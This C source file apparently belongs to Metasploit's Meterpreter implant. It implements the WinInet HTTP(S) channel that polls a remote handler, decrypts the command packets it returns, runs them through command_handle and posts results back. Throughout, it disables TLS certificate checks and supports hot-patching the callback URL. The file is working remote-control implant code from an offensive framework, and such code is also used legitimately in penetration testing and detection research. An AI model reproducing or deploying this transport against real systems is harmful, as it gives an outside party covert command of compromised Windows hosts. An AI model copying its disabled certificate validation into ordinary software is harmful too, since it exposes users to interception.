/*!
 * @file server_transport_wininet.c
 */
//#include "../../common/common.h"
//#include "../../common/config.h"
#include "metsrv.h"
#include <wininet.h>

/*!
 * @brief Prepare a wininet request with the given context.
 * @param ctx Pointer to the HTTP transport context to prepare the request from.
 * @param direction String representing the direction of the communications (for debug).
 * @return An Internet request handle.
 */
static HINTERNET get_wininet_req(HttpTransportContext *ctx, const char *direction)
{
	HINTERNET hReq = NULL;
	DWORD flags = INTERNET_FLAG_RELOAD
		| INTERNET_FLAG_NO_CACHE_WRITE
		| INTERNET_FLAG_KEEP_CONNECTION
		| INTERNET_FLAG_NO_AUTO_REDIRECT
		| INTERNET_FLAG_NO_UI;

	if (ctx->ssl)
	{
		flags |= INTERNET_FLAG_SECURE
			| INTERNET_FLAG_IGNORE_CERT_CN_INVALID
			| INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
		dprintf("[%s] Setting secure request flag..", direction);
	}

	do
	{
		vdprintf("[%s] opening request on connection %x to %S", direction, ctx->connection, ctx->uri);
		hReq = HttpOpenRequestW(ctx->connection, L"POST", ctx->uri, NULL, NULL, NULL, flags, 0);

		if (hReq == NULL)
		{
			dprintf("[%s] Failed HttpOpenRequestW: %d", direction, GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		if (ctx->ssl)
		{
			DWORD secureFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID
				| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
				| SECURITY_FLAG_IGNORE_WRONG_USAGE
				| SECURITY_FLAG_IGNORE_UNKNOWN_CA
				| SECURITY_FLAG_IGNORE_REVOCATION;

			dprintf("[%s] Setting secure option flags", direction);
			if (!InternetSetOptionW(hReq, INTERNET_OPTION_SECURITY_FLAGS, &secureFlags, sizeof(secureFlags)))
			{
				dprintf("[%s] Failed InternetSetOptionW: %d", direction, GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}
		}

		return hReq;
	} while (0);

	if (hReq != NULL)
	{
		InternetCloseHandle(hReq);
	}

	return NULL;
}

/*!
 * @brief Windows-specific function to transmit a packet via HTTP(s) using wininet _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available on POSIX.
 */
static DWORD packet_transmit_via_http_wininet(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	DWORD res = 0;
	HINTERNET hReq;
	BOOL hRes;
	DWORD retries = 5;
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
	unsigned char *buffer;

	buffer = malloc(packet->payloadLength + sizeof(TlvHeader));
	if (!buffer)
	{
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}

	memcpy(buffer, &packet->header, sizeof(TlvHeader));
	memcpy(buffer + sizeof(TlvHeader), packet->payload, packet->payloadLength);

	do
	{
		hReq = get_wininet_req(ctx, "PACKET TRANSMIT");
		if (hReq == NULL)
		{
			break;
		}

		hRes = HttpSendRequestW(hReq, NULL, 0, buffer, packet->payloadLength + sizeof(TlvHeader));

		if (!hRes)
		{
			dprintf("[PACKET TRANSMIT] Failed HttpSendRequestW: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		dprintf("[PACKET TRANSMIT] request sent.. apparently");
	} while(0);

	memset(buffer, 0, packet->payloadLength + sizeof(TlvHeader));
	InternetCloseHandle(hReq);
	return res;
}

/*!
 * @brief Transmit a packet via HTTP(s) _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_transmit_via_http(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	CryptoContext *crypto;
	Tlv requestId;
	DWORD res;

	lock_acquire(remote->lock);

	// If the packet does not already have a request identifier, create one for it
	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
	{
		DWORD index;
		CHAR rid[32];

		rid[sizeof(rid)-1] = 0;

		for (index = 0; index < sizeof(rid)-1; index++)
		{
			rid[index] = (rand() % 0x5e) + 0x21;
		}

		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
	}

	do
	{
		// If a completion routine was supplied and the packet has a request
		// identifier, insert the completion routine into the list
		if ((completion) &&
			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
			&requestId) == ERROR_SUCCESS))
		{
			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
		}

		// If the endpoint has a cipher established and this is not a plaintext
		// packet, we encrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = packet->payloadLength;
			PUCHAR origPayload = packet->payload;

			// Encrypt
			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
				packet->payloadLength, &packet->payload,
				&packet->payloadLength)) !=
				ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// Destroy the original payload as we no longer need it
			free(origPayload);

			// Update the header length
			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
		}

		dprintf("[PACKET] Transmitting packet of length %d to remote", packet->payloadLength);
		res = packet_transmit_via_http_wininet(remote, packet, completion);
		if (res < 0)
		{
			dprintf("[PACKET] transmit failed with return %d\n", res);
			break;
		}

		SetLastError(ERROR_SUCCESS);
	} while (0);

	res = GetLastError();

	// Destroy the packet
	packet_destroy(packet);

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief Windows-specific function to receive a new packet via WinInet.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available in POSIX.
 */
static DWORD packet_receive_http_via_wininet(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	CryptoContext *crypto = NULL;
	Packet *localPacket = NULL;
	TlvHeader header;
	LONG bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR payload = NULL;
	ULONG payloadLength;
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	HINTERNET hReq;
	BOOL hRes;
	DWORD retries = 5;

	lock_acquire(remote->lock);

	do
	{
		hReq = get_wininet_req(ctx, "PACKET RECEIVE");
		if (hReq == NULL)
		{
			break;
		}

		vdprintf("[PACKET RECEIVE WININET] sending the 'RECV' command...");
		DWORD recv = 'VCER';
		hRes = HttpSendRequestW(hReq, NULL, 0, &recv, sizeof(recv));
		if (!hRes)
		{
			dprintf("[PACKET RECEIVE WININET] Failed HttpSendRequestW: %d %d", GetLastError(), WSAGetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		DWORD statusCode;
		DWORD statusCodeSize = sizeof(statusCode);
		vdprintf("[PACKET RECEIVE WININET] Getting the result code...");
		if (HttpQueryInfoW(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, 0))
		{
			vdprintf("[PACKET RECEIVE WININET] Returned status code is %d", statusCode);

			// did the request succeed?
			if (statusCode != 200)
			{
				// bomb out
				SetLastError(ERROR_HTTP_INVALID_SERVER_RESPONSE);
				break;
			}
		}

		// Read the packet length
		retries = 3;
		vdprintf("[PACKET RECEIVE WININET] Start looping through the receive calls");
		while (inHeader && retries > 0)
		{
			retries--;
			if (!InternetReadFile(hReq, (PUCHAR)&header + headerBytes, sizeof(TlvHeader)-headerBytes, &bytesRead))
			{
				dprintf("[PACKET RECEIVE] Failed HEADER InternetReadFile: %d", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			vdprintf("[PACKET RECEIVE WININET] Data received: %u bytes", bytesRead);

			// If the response contains no data, this is fine, it just means the
			// remote side had nothing to tell us. Indicate this through a
			// ERROR_EMPTY response code so we can update the timestamp.
			if (bytesRead == 0)
			{
				SetLastError(ERROR_EMPTY);
				break;
			}

			headerBytes += bytesRead;

			if (headerBytes != sizeof(TlvHeader))
			{
				continue;
			}

			inHeader = FALSE;
		}

		if (GetLastError() == ERROR_EMPTY)
		{
			break;
		}

		if (headerBytes != sizeof(TlvHeader))
		{
			dprintf("[PACKET RECEIVE WININET] headerBytes no valid");
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		// Initialize the header
		vdprintf("[PACKET RECEIVE WININET] initialising header");
		header.length = header.length;
		header.type = header.type;
		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(payload = (PUCHAR)malloc(payloadLength)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Read the payload
		retries = payloadBytesLeft;
		while (payloadBytesLeft > 0 && retries > 0)
		{
			vdprintf("[PACKET RECEIVE WININET] reading more data from the body...");
			retries--;
			if (!InternetReadFile(hReq, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, &bytesRead))
			{
				dprintf("[PACKET RECEIVE] Failed BODY InternetReadFile: %d", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			if (!bytesRead)
			{
				vdprintf("[PACKET RECEIVE WININET] no bytes read, bailing out");
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			vdprintf("[PACKET RECEIVE WININET] bytes read: %u", bytesRead);
			payloadBytesLeft -= bytesRead;
		}

		// Didn't finish?
		if (payloadBytesLeft)
		{
			break;
		}

		// Allocate a packet structure
		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		memset(localPacket, 0, sizeof(Packet));

		// If the connection has an established cipher and this packet is not
		// plaintext, decrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = payloadLength;
			PUCHAR origPayload = payload;

			// Decrypt
			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// We no longer need the encrypted payload
			free(origPayload);
		}

		localPacket->header.length = header.length;
		localPacket->header.type = header.type;
		localPacket->payload = payload;
		localPacket->payloadLength = payloadLength;

		*packet = localPacket;

		SetLastError(ERROR_SUCCESS);

	} while (0);

	res = GetLastError();

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		if (payload)
		{
			free(payload);
		}
		if (localPacket)
		{
			free(localPacket);
		}
	}

	if (hReq)
	{
		InternetCloseHandle(hReq);
	}

	lock_release(remote->lock);

	return res;
}


/*!
 * @brief Initialise the HTTP(S) connection.
 * @param remote Pointer to the remote instance with the HTTP(S) transport details wired in.
 * @param sock Reference to the original socket FD passed to metsrv (ignored);
 * @return Indication of success or failure.
 */
static BOOL server_init_http(Transport* transport)
{
	URL_COMPONENTS bits;
	wchar_t tmpHostName[URL_SIZE];
	wchar_t tmpUrlPath[URL_SIZE];
	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

	dprintf("[WININET] Initialising ...");

	// configure proxy
	if (ctx->proxy)
	{
		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
		ctx->internet = InternetOpenW(ctx->ua, INTERNET_OPEN_TYPE_PROXY, ctx->proxy, NULL, 0);
	}
	else
	{
		ctx->internet = InternetOpenW(ctx->ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	}

	if (!ctx->internet)
	{
		dprintf("[DISPATCH] Failed InternetOpenW: %d", GetLastError());
		return FALSE;
	}

	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", ctx->internet);

	// The InternetCrackUrl method was poorly designed...
	ZeroMemory(tmpHostName, sizeof(tmpHostName));
	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));

	ZeroMemory(&bits, sizeof(bits));
	bits.dwStructSize = sizeof(bits);

	bits.dwHostNameLength = URL_SIZE - 1;
	bits.lpszHostName = tmpHostName;

	bits.dwUrlPathLength = URL_SIZE - 1;
	bits.lpszUrlPath = tmpUrlPath;

	dprintf("[DISPATCH] About to crack URL: %S", transport->url);
	InternetCrackUrlW(transport->url, 0, 0, &bits);

	SAFE_FREE(ctx->uri);
	ctx->uri = _wcsdup(tmpUrlPath);
	transport->comms_last_packet = current_unix_timestamp();

	dprintf("[DISPATCH] Configured URI: %S", ctx->uri);
	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);

	// Allocate the connection handle
	ctx->connection = InternetConnectW(ctx->internet, tmpHostName, bits.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!ctx->connection)
	{
		dprintf("[DISPATCH] Failed InternetConnect: %d", GetLastError());
		return FALSE;
	}

	if (ctx->proxy)
	{
		if (ctx->proxy_user)
		{
			InternetSetOptionW(ctx->connection, INTERNET_OPTION_PROXY_USERNAME, ctx->proxy_user, wcslen(ctx->proxy_user));
		}
		if (ctx->proxy_pass)
		{
			InternetSetOptionW(ctx->connection, INTERNET_OPTION_PROXY_PASSWORD, ctx->proxy_pass, wcslen(ctx->proxy_pass));
		}
	}

	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);

	return TRUE;
}

/*!
 * @brief Deinitialise the HTTP(S) connection.
 * @param remote Pointer to the remote instance with the HTTP(S) transport details wired in.
 * @return Indication of success or failure.
 */
static DWORD server_deinit_http(Transport* transport)
{
	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

	dprintf("[WININET] Deinitialising ...");

	if (ctx->connection)
	{
		InternetCloseHandle(ctx->connection);
		ctx->connection = NULL;
	}

	if (ctx->internet)
	{
		InternetCloseHandle(ctx->internet);
		ctx->internet = NULL;
	}

	return TRUE;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using HTTP(S).
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet* packet = NULL;
	THREAD* cpt = NULL;
	DWORD ecount = 0;
	DWORD delay = 0;
	Transport* transport = remote->transport;
	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

	while (running)
	{
		if (transport->timeouts.comms != 0 && transport->comms_last_packet + transport->timeouts.comms < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (remote->sess_expiry_end != 0 && remote->sess_expiry_end < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->sess_expiry_end);
			break;
		}

		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive_http_via_wininet(remote, &packet);

		if (result != ERROR_SUCCESS)
		{
			// Update the timestamp for empty replies
			if (result == ERROR_EMPTY)
			{
				transport->comms_last_packet = current_unix_timestamp();
			}
			else if (result == ERROR_HTTP_INVALID_SERVER_RESPONSE)
			{
				// if we have WinInet problems, it's game over
				break;
			}

			delay = 10 * ecount;
			if (ecount >= 10)
			{
				delay *= 10;
			}

			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep(min(10000, delay));
		}
		else
		{
			transport->comms_last_packet = current_unix_timestamp();

			// Reset the empty count when we receive a packet
			ecount = 0;

			dprintf("[DISPATCH] Returned result: %d", result);

			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));

			if (ctx->new_uri != NULL)
			{
				dprintf("[DISPATCH] Recieved hot-patched URL for stageless: %S", ctx->new_uri);
				dprintf("[DISPATCH] Old URI is: %S", ctx->uri);
				dprintf("[DISPATCH] Old URL is: %S", transport->url);

				// if the new URI needs more space, let's realloc space for the new URL now
				int diff = (int)wcslen(ctx->new_uri) - (int)wcslen(ctx->uri);
				if (diff > 0)
				{
					dprintf("[DISPATCH] New URI is bigger by %d", diff);
					transport->url = (wchar_t*)realloc(transport->url, (wcslen(transport->url) + diff + 1) * sizeof(wchar_t));
				}

				// we also need to patch the new URI into the original transport URL, not just the currently
				// active URI for comms. If we don't, then migration behaves badly.
				// Start by locating the start of the URI in the current URL, by finding the third slash
				wchar_t* csr = transport->url + wcslen(transport->url) - 2;
				while (*csr != L'/')
				{
					--csr;
				}
				dprintf("[DISPATCH] Pointer is at: %p -> %S", csr, csr);

				// patch in the new URI
				wcscpy_s(csr, wcslen(diff > 0 ? ctx->new_uri : ctx->uri) + 1, ctx->new_uri);
				dprintf("[DISPATCH] New URL is: %S", transport->url);

				// clean up
				SAFE_FREE(ctx->uri);
				ctx->uri = ctx->new_uri;
				ctx->new_uri = NULL;
			}
		}
	}

	return result;
}

/*!
 * @brief Take over control from the WinINET transport.
 * @param transport Pointer to the transport to hijack.
 */
void transport_move_to_wininet(Transport* transport)
{
	transport->packet_transmit = packet_transmit_via_http;
	transport->server_dispatch = server_dispatch_http;
	transport->transport_init = server_init_http;
	transport->transport_deinit = server_deinit_http;
}
